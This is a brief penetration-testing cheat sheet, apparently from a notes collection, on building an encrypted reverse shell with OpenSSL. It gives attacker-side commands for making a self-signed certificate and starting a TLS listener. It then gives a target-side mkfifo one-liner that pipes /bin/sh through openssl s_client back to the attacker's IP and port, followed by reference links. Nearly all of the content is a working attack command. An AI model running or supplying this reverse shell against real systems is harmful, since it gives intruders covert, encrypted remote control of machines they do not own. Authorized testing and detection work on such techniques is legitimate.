# OpenSSL

## 06 - Generate a TLS certificate to encrypt the network traffic

- Listener

`user@pentestos:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`

`user@pentestos:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>`

`user@pentestos:~$ ncat --ssl -vv -l -p <PORT>`

- Target

`$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s`

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

- [Rio Asmara Suryadi: OpenSSL for Reverse Shell](https://rioasmara.com/2020/06/22/openssl-for-reverse-shell/)

- [Day 43 Reverse Shell with OpenSSL](https://int0x33.medium.com/day-43-reverse-shell-with-openssl-1ee2574aa998)

- [Detecting and Investigating OpenSSL Backdoors on Linux](https://www.sandflysecurity.com/blog/detecting-and-investigating-openssl-backdoors-on-linux/)